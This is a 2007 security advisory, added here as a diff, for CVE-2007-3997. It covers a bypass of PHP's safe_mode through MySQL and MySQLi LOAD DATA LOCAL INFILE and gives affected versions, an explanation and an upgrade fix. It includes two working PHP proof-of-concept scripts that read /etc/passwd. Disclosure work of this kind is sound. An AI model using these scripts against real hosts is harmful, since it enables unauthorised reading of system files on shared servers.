@@ -1,0 +1,80 @@
+
+
+Affected Products:
+<= PHP 5.2.3
+<= PHP 4.4.7
+
+Authors:
+Mattias Bengtsson <mattias@secweb.se>
+Philip Olausson <po@secweb.se>
+
+Reported:
+2007-06-05
+
+Released:
+2007-08-30
+
+CVE:
+CVE-2007-3997
+
+Issue:
+
+A vulnerability exists in PHP's MySQL and MySQLi extenstions which can be used to bypass PHP's safe_mode security restriction.
+
+Description:
+
+PHP is a widely-used general-purpose scripting language that is especially suited for Web development and can be embedded into HTML.
+
+Details:
+
+By using MySQLs LOCAL INFILE we could bypass PHP's safe_mode security restriction. An important thing here is that we can't rely on the shared hosts MySQLds local-infile=0 option. This because of it being a server option, so it will not have any effect on the client. To disable this option for MySQL we need to compile libmysqlclient with --disable-local-infile, or remove the CLIENT_LOCAL_FILES flag while connecting. PHP does this when open_basedir are in effect but lacks a check for safe_mode.
+
+For MySQLi compiling with --disable-local-infile won't help because we could just reenable it with mysqli->options(MYSQLI_OPT_LOCAL_INFILE, 1);
+
+Proof Of Concepts:
+
+MySQL: 
+
+<?php
+
+file_get_contents('/etc/passwd');
+
+$l = mysql_connect("localhost", "root");
+mysql_query("CREATE DATABASE a");
+mysql_query("CREATE TABLE a.a (a varchar(1024))");
+mysql_query("GRANT SELECT,INSERT ON a.a TO 'aaaa'@'localhost'");
+mysql_close($l); mysql_connect("localhost", "aaaa");
+
+mysql_query("LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE a.a");
+
+$result = mysql_query("SELECT a FROM a.a");
+while(list($row) = mysql_fetch_row($result))
+    print $row . chr(10);
+
+?>
+
+MySQLi:
+
+<?php
+
+function r($fp, &$buf, $len, &$err) {
+      print fread($fp, $len);
+}
+
+$m = new mysqli('localhost', 'aaaa', '', 'a');
+$m->options(MYSQLI_OPT_LOCAL_INFILE, 1);
+$m->set_local_infile_handler("r");
+$m->query("LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE a.a");
+$m->close();
+
+?>
+
+Impact:
+
+This issue could have major impact on shared hosting systems.
+
+Solution:
+
+Upgrade PHP to 5.2.4 or 4.4.8
+
+# milw0rm.com [2007-09-10]
